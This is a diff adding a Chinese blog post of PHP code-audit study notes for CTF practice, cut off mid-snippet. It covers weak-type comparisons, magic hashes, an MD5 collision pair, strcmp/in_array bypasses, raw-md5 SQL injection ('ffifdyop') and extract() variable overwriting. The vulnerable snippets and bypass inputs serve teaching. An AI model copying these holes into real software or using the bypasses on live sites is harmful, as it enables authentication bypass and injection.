@@ -1,0 +1,1040 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>安全牛PHP代码审计学习笔记 - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="安全牛PHP代码审计学习笔记" />
+<meta property="og:description" content="0x00 弱类型相关要点及md5 $a == $b 等于TRUE，如果类型转换后$a 等于$b。 $a === $b 全等TRUE，如果$a 等于$b，并且它们的类型也相同。 如果一个" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-25T15:33:00+00:00" />
+<meta property="article:modified_time" content="2021-04-25T15:33:00+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="安全牛PHP代码审计学习笔记"/>
+<meta name="twitter:description" content="0x00 弱类型相关要点及md5 $a == $b 等于TRUE，如果类型转换后$a 等于$b。 $a === $b 全等TRUE，如果$a 等于$b，并且它们的类型也相同。 如果一个"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="prev" href="https://hannibal0x.github.io/2021-04-13-%E5%AE%89%E5%85%A8%E7%89%9Bxxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="next" href="https://hannibal0x.github.io/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "安全牛PHP代码审计学习笔记",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\/"
+        },"genre": "posts","keywords": "Web安全, CTF","wordcount":  6120 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\/","datePublished": "2021-04-25T15:33:00+00:00","dateModified": "2021-04-25T15:33:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">安全牛PHP代码审计学习笔记</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>学习</a>&nbsp;<a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-04-25">2021-04-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6120 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-弱类型相关要点及md5">0x00 弱类型相关要点及md5</a></li>
+    <li><a href="#0x01-弱类型相关函数">0x01 弱类型相关函数</a></li>
+    <li><a href="#0x02-变量覆盖问题">0x02 变量覆盖问题</a></li>
+    <li><a href="#0x03-空白符问题">0x03 空白符问题</a></li>
+    <li><a href="#0x04-伪随机数问题">0x04 伪随机数问题</a></li>
+    <li><a href="#0x05-其他函数问题">0x05 其他函数问题</a></li>
+    <li><a href="#0x06-正则匹配相关问题">0x06 正则匹配相关问题</a></li>
+    <li><a href="#0x07-disable_function绕过">0x07 Disable_function绕过</a></li>
+    <li><a href="#0x08-找源码扫描fuzz">0x08 找源码、扫描、FUZZ</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="0x00-弱类型相关要点及md5">0x00 弱类型相关要点及md5</h2>
+<p>$a == $b 等于TRUE，如果类型转换后$a 等于$b。<br>
+$a === $b 全等TRUE，如果$a 等于$b，并且它们的类型也相同。</p>
+<p>如果一个数值和一个字符串比较，那么会将字符串转换为数值。</p>
+<pre class="wp-block-code"><code>''== 0 == false
+'123' == 123
+'abc' == 0
+'123a' == 123 
+0x01 == 1
+'0e123456789' == '0e987654321' 
+&#91;false] == &#91;0] == &#91;NULL] == &#91;'']
+NULL == false == 0
+true == 1</code></pre>
+<p><strong>MD5案例1</strong></p>
+<pre class="wp-block-code"><code>&lt;?php
+ini_set("display error", false);
+error_reporting(0);
+if($_POST&#91;'param1']!=$_POST&#91;'param2']&&md5($_POST&#91;'param1'])==md5($_POST&#91;'param2']))
+{
+	die("success");
+}
+else
+{
+	echo "fail";
+}</code></pre>
+<p>在PHP中，利用”!=”或”==”来对哈希值进行比较时，PHP会把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。参考：<a href="https://blog.csdn.net/nzjdsds/article/details/90085112" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://blog.csdn.net/nzjdsds/article/details/90085112" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/nzjdsds/article/details/90085112</a></a></p>
+<p><strong>MD5案例2</strong></p>
+<pre class="wp-block-code"><code>&lt;?php
+ini_set("display error", false);
+error_reporting(0);
+if($_POST&#91;'param1']!==$_POST&#91;'param2']&&md5($_POST&#91;'param1'])===md5($_POST&#91;'param2']))
+{
+	die("success");
+}
+else
+{
+	echo "fail";
+}</code></pre>
+<p>通过函数返回，返回不是md5，例如数组：param1[]=1&amp;param2[]=2</p>
+<p><strong>MD5案例3</strong></p>
+<pre class="wp-block-code"><code>&lt;?php
+ini_set("display error", false);
+error_reporting(0);
+if((string)$_POST&#91;'param1']!==(string)$_POST&#91;'param2']&&md5($_POST&#91;'param1'])===md5($_POST&#91;'param2']))
+{
+	die("success");
+}
+else
+{
+	echo "fail";
+}</code></pre>
+<p>md5强碰撞<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="843" height="228" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-292.png" alt="" class="wp-image-3376" /></figure></p>
+<p>通过python脚本解码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;2.txt&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;a:&#34;</span> <span class="o">+</span> <span class="n">a</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;b:&#34;</span> <span class="o">+</span> <span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="p">:</span><span class="o">%</span><span class="mi">14</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">3</span><span class="n">DYd</span><span class="o">%</span><span class="n">EF</span><span class="o">%</span><span class="n">AC</span><span class="o">%</span><span class="mi">9</span><span class="n">BF</span><span class="o">%</span><span class="n">FF</span><span class="o">%</span><span class="mi">12</span><span class="o">%</span><span class="mi">16</span><span class="o">%</span><span class="mi">0</span><span class="n">AL</span><span class="o">%</span><span class="n">FA</span><span class="o">%</span><span class="mf">1E9</span><span class="n">wi</span><span class="o">%</span><span class="n">C9r</span><span class="o">%</span><span class="mi">9</span><span class="n">F</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="n">AA</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="n">F6x</span><span class="o">%</span><span class="n">B1</span><span class="o">%</span><span class="mf">93.</span><span class="o">%</span><span class="mi">10</span><span class="o">%</span><span class="n">A0</span><span class="o">%</span><span class="mi">60</span><span class="o">%</span><span class="n">CB</span><span class="o">%</span><span class="n">BB</span><span class="o">%</span><span class="mi">09</span><span class="o">%</span><span class="n">F2</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">.%</span><span class="mi">29</span><span class="o">%</span><span class="n">CF</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="n">CB</span><span class="o">%</span><span class="n">FA</span><span class="o">%</span><span class="n">DBw4rH</span><span class="o">%</span><span class="n">D6</span><span class="o">%</span><span class="mi">1</span><span class="n">B</span><span class="o">%</span><span class="mi">8</span><span class="n">A</span><span class="o">%</span><span class="mi">23</span><span class="o">%</span><span class="mi">11</span><span class="o">%</span><span class="mi">7</span><span class="n">C</span><span class="o">%</span><span class="n">D5</span><span class="o">%</span><span class="n">D8G</span><span class="o">%</span><span class="n">DE</span><span class="o">%</span><span class="mi">8</span><span class="n">F</span><span class="o">%</span><span class="mi">19</span><span class="o">%</span><span class="mi">7</span><span class="n">C</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="n">BEd</span><span class="o">%</span><span class="n">C0C</span><span class="o">%</span><span class="n">D6x</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="n">D3</span><span class="o">%</span><span class="mi">02</span><span class="n">G7</span><span class="o">/%</span><span class="n">E47</span><span class="o">%</span><span class="mi">0</span><span class="n">C</span><span class="o">%</span><span class="mi">1</span><span class="n">B</span><span class="o">%</span><span class="n">FA</span><span class="o">%</span><span class="mi">9</span><span class="n">E</span><span class="o">%</span><span class="n">A7</span><span class="o">%</span><span class="mi">40</span><span class="o">%</span><span class="n">F9</span><span class="o">%</span><span class="mi">12</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="n">A0</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="n">C9</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="n">F5</span><span class="o">%</span><span class="n">C4</span><span class="o">%</span><span class="n">D1</span><span class="o">%</span><span class="mi">19</span><span class="n">Y</span><span class="o">%</span><span class="n">A2</span><span class="o">%</span><span class="n">B7F</span><span class="o">%</span><span class="mi">17</span><span class="o">%</span><span class="n">E20</span><span class="o">%</span><span class="n">DCrS</span><span class="o">%</span><span class="n">CF</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">C0</span><span class="o">%</span><span class="n">EFr</span><span class="o">~</span><span class="n">W</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="n">E8</span><span class="o">%</span><span class="mi">93</span><span class="n">KS</span><span class="o">%</span><span class="mi">1</span><span class="n">E</span><span class="o">%</span><span class="n">F7</span><span class="o">%</span><span class="n">F0</span><span class="o">%</span><span class="n">CA</span><span class="o">%</span><span class="mi">9</span><span class="n">A</span><span class="o">%</span><span class="mi">3</span><span class="n">Bf</span><span class="o">%</span><span class="mi">2</span><span class="n">AQ</span><span class="o">%</span><span class="mi">05</span><span class="o">%</span><span class="n">EC</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">b</span><span class="p">:</span><span class="o">%</span><span class="mi">14</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">3</span><span class="n">DYd</span><span class="o">%</span><span class="n">EF</span><span class="o">%</span><span class="n">AC</span><span class="o">%</span><span class="mi">9</span><span class="n">BF</span><span class="o">%</span><span class="n">FF</span><span class="o">%</span><span class="mi">12</span><span class="o">%</span><span class="mi">16</span><span class="o">%</span><span class="mi">0</span><span class="n">AL</span><span class="o">%</span><span class="n">FA</span><span class="o">%</span><span class="mf">1E9</span><span class="n">wiIr</span><span class="o">%</span><span class="mi">9</span><span class="n">F</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="n">AA</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="n">F6x</span><span class="o">%</span><span class="n">B1</span><span class="o">%</span><span class="mf">93.</span><span class="o">%</span><span class="mi">10</span><span class="o">%</span><span class="n">A0</span><span class="o">%</span><span class="mi">60</span><span class="o">%</span><span class="n">CB</span><span class="o">%</span><span class="n">BB</span><span class="o">%</span><span class="mi">09</span><span class="o">%</span><span class="n">F2</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">.%</span><span class="mi">29</span><span class="o">%</span><span class="n">CF</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="n">CB</span><span class="o">%</span><span class="n">FA</span><span class="o">%</span><span class="n">DB</span><span class="o">%</span><span class="n">F74rH</span><span class="o">%</span><span class="n">D6</span><span class="o">%</span><span class="mi">1</span><span class="n">B</span><span class="o">%</span><span class="mi">8</span><span class="n">A</span><span class="o">%</span><span class="mi">23</span><span class="o">%</span><span class="mi">11</span><span class="o">%</span><span class="mi">7</span><span class="n">C</span><span class="o">%</span><span class="n">D5</span><span class="o">%</span><span class="n">D8G</span><span class="o">%</span><span class="n">DE</span><span class="o">%</span><span class="mi">0</span><span class="n">F</span><span class="o">%</span><span class="mi">19</span><span class="o">%</span><span class="mi">7</span><span class="n">C</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="n">BEd</span><span class="o">%</span><span class="n">C0C</span><span class="o">%</span><span class="n">D6x</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="n">D3</span><span class="o">%</span><span class="mi">02</span><span class="n">G7</span><span class="o">/%</span><span class="n">E47</span><span class="o">%</span><span class="mi">0</span><span class="n">C</span><span class="o">%</span><span class="mi">1</span><span class="n">B</span><span class="o">%</span><span class="n">FA</span><span class="o">%</span><span class="mi">9</span><span class="n">E</span><span class="o">%</span><span class="n">A7</span><span class="o">%</span><span class="mi">40</span><span class="n">y</span><span class="o">%</span><span class="mi">12</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="n">A0</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="n">C9</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="n">F5</span><span class="o">%</span><span class="n">C4</span><span class="o">%</span><span class="n">D1</span><span class="o">%</span><span class="mi">19</span><span class="n">Y</span><span class="o">%</span><span class="n">A2</span><span class="o">%</span><span class="n">B7F</span><span class="o">%</span><span class="mi">17</span><span class="o">%</span><span class="n">E20</span><span class="o">%</span><span class="n">DCrS</span><span class="o">%</span><span class="n">CF</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">C0</span><span class="o">%</span><span class="n">EFr</span><span class="o">%</span><span class="n">FEV</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="n">E8</span><span class="o">%</span><span class="mi">93</span><span class="n">KS</span><span class="o">%</span><span class="mi">1</span><span class="n">E</span><span class="o">%</span><span class="n">F7</span><span class="o">%</span><span class="n">F0</span><span class="o">%</span><span class="n">CA</span><span class="o">%</span><span class="mi">9</span><span class="n">A</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">2</span><span class="n">AQ</span><span class="o">%</span><span class="mi">05</span><span class="o">%</span><span class="n">EC</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>sha相关案例</strong></p>
+<pre class="wp-block-code"><code>&lt;?php
+ini_set("display error", false);
+error_reporting(0);
+$flag = "flag";
+if(isset($_GET&#91;'name']) and isset($_GET&#91;'password']))
+{
+	if ($_GET&#91;'name'] == $_GET&#91;'password'])
+		echo '&lt;p&gt;Your password can not br yout name!&lt;/p&gt;';
+	else if (sha1($_GET&#91;'name']) === sha1($_GET&#91;'password'])
+		die('Flag:' .$flag);
+	else
+		echo '&lt;p&gt;Invalid password.&lt;/p&gt;';
+}
+else
+	echo "&lt;p&gt;Login first!&lt;/p&gt;";</code></pre>
+<p>与 MD5案例2 类似</p>
+<p><strong>Md5与SQL注入的融合</strong></p>
+<pre class="wp-block-code"><code>&lt;?php
+error_reporting(0);
+$link = mysql_connect('localhost','root','root');
+if(!$link){
+	die('Could not connect to MySQL: '.mysql_error());
+}
+
+$db = mysql_select_db("test", $link);
+if(!$db)
+{
+	echo 'select db error';
+	exit();
+}
+
+$password = $_GET&#91;'password'];
+$sql = "SELECT * FROM admin WHERE pass = '".md5($password, true)."'";
+
+$result=mysql_query($sql) or die('&lt;pre&gt;'. mysql_error().'&lt;/pre&gt;');
+$rowl= mysql_fetch_row($result);
+var_dump($row1);
+mysql_close($link);</code></pre>
+<p>md5为true 时，返回 16 字符长度的原始二进制格式的摘要。例如：echo md5(&lsquo;ffifdyop&rsquo;,true);<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="449" height="31" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-293.png" alt="" class="wp-image-3380" /> </figure></p>
+<h2 id="0x01-弱类型相关函数">0x01 弱类型相关函数</h2>
+<p><strong>JSON相关问题</strong></p>
+<pre class="wp-block-code"><code>&lt;?php
+highlight_file(__FIlE__);
+include "flag. php";
+if (isset($_POST&#91;'message'])) {
+	$message = json_decode($_POST&#91;'message']);
+	if($message-&gt;key == $key) {
+		echo $flag;
+	}
+	else {
+		echo "fail";
+	}
+}
+else{
+	echo "~~~~";
+}
+?&gt;</code></pre>
+<p>json_decode对 JSON 格式的字符串进行解码，构造message={&ldquo;key&rdquo;:0}。</p>
+<p><strong>SWITCH相关问题</strong></p>
+<p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。</p>
+<pre class="wp-block-code"><code>&lt;?php
+highlight_file(__FIlE__);
+$i = "3name";
+switch ($i){
+case 0:
+case 1:
+case 2:
+	echo "this is two";
+	break;
+case 3:
+	echo "flag";
+break;
+}
+?&gt;</code></pre>
+<p>执行的结果是<code>flag</code>。</p>
+<p><strong>STRCMP相关问题</strong></p>
+<p><code>strcmp(string $str1, string $str2)</code>，二进制安全字符串比较，如果 <code>str1</code> 小于 <code>str2</code> 返回 &lt; 0； 如果 <code>str1</code> 大于 <code>str2</code> 返回 &gt; 0；如果两者相等，返回 0。比较过程应该是转化成ASCII后逐字节进行比较，然后根据运算结果来决定返回值。</p>
+<p>strcmp(&lsquo;a&rsquo;,1)&ndash;&gt;48， strcmp(&lsquo;1cc&rsquo;,&lsquo;1ca&rsquo;)&ndash;&gt;2。</p>
+<pre class="wp-block-code"><code>&lt;?php
+highlight_file(__FIlE__);
+include "flag.php";
+if(isset($_POST&#91;'password'])){
+	if (strcmp($_POST&#91;'password'], $password)==0){
+		echo "Right!!! login success";
+		echo $flag;
+		exit();
+} else {
+	echo "Wrong password..";
+		}
+}
+?&gt;</code></pre>
+<p>构造函数返回值为NULL，弱类型与0相等。</p>
+<p><strong>IN_ARRAY相关问题</strong></p>
+<p><code>in_array</code>，检查数组中是否存在某个值，in_array(mixed<code>$needle</code>, array <code>$haystack</code>, bool <code>$strict</code> = <code>false</code>): bool。大海捞针，在大海（<code>haystack</code>）中搜索针（ <code>needle</code>），如果没有设置 <code>strict</code> 则使用宽松的比较。如果第三个参数 <code>strict</code> 的值为 <strong><code>true</code></strong> 则 <strong>in_array()</strong> 函数还会检查 <code>needle</code> 的类型是否和 <code>haystack</code> 中的相同。</p>
+<pre class="wp-block-code"><code>&lt;?php
+highlight_file(__FIlE__);
+$array = &#91;0,1,2,'3'];
+var_dump(in_array('abc', $array));
+var_dump(in_array('1bc', $array));
+var_dump(in_array(3, $array));</code></pre>
+<p>结果会是bool(true)，bool(true)，bool(true)。</p>
+<p><strong>ARRAY_SEARCH相关问题</strong></p>
+<p>a<code>rray_search</code>，在数组中搜索给定的值，如果成功则返回首个相应的键名，与上面的类似。</p>
+<pre class="wp-block-code"><code>&lt;?php
+highlight_file(__FIlE__);
+$array = &#91;0,1,2,'3'];
+var_dump(array_search('abc', $array));
+var_dump(array_search('1bc', $array));
+var_dump(array_search(3, $array));
+var_dump(array_search('3', $array));</code></pre>
+<p>结果为int(0)，int(1)，int(3)，int(3)。</p>
+<p>此函数可能返回布尔值 false，但也可能返回等同于 false 的非布尔值。</p>
+<pre class="wp-block-code"><code>&lt;?php
+#highlight_file(__FIlE__);
+include "flag.php"
+if(!is_array($_GET&#91;'test'])){exit();}
+$test = $_GET&#91;'test'];
+for($ i= 0; $i&lt;count($test); $i++){
+	if($test&#91;$i] === "admin"){
+	echo "error";
+	exit();
+	}
+	$test&#91;$i]=intval($test&#91;$i]);
+if(array_search("admin", $test)===0){
+	echo $flag;
+}
+else{
+	echo "false";
+}</code></pre>
+<p>传入test[]=0，即可获得flag。</p>
+<p><strong>strpos相关问题</strong></p>
+<p><code>strpos</code>，查找字符串首次出现的位置<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-294.png" alt="" class="wp-image-3391" width="509" height="92" /> </figure></p>
+<p>如果逻辑中出现用strpos来做判断，那就有可能带来安全问题。</p>
+<h2 id="0x02-变量覆盖问题">0x02 变量覆盖问题</h2>
+<p><strong>Extract()</strong></p>
+<p><code>extract</code>，从数组中将变量导入到当前的符号表。</p>
+<p>范例</p>
+<pre class="wp-block-code"><code>
+&lt;?php
+
+/* 假定 $var_array 是 wddx_deserialize 返回的数组*/
+
+$size = "large";
+$var_array = array("color" =&gt; "blue",
+                   "size"  =&gt; "medium",
+                   "shape" =&gt; "sphere");
+extract($var_array, EXTR_PREFIX_SAME, "wddx");
+
+echo "$color, $size, $shape, $wddx_size\n";
+
+?&gt;</code></pre>
+<p><code>EXTR_PREFIX_SAME</code> 如果有冲突，在变量名前加上前缀。输出结果为：blue, large, sphere, medium。</p>
+<pre class="wp-block-code"><code>&lt;?php
+highlight_file(__FIlE__);
+include "flag.php"
+extract($_GET);
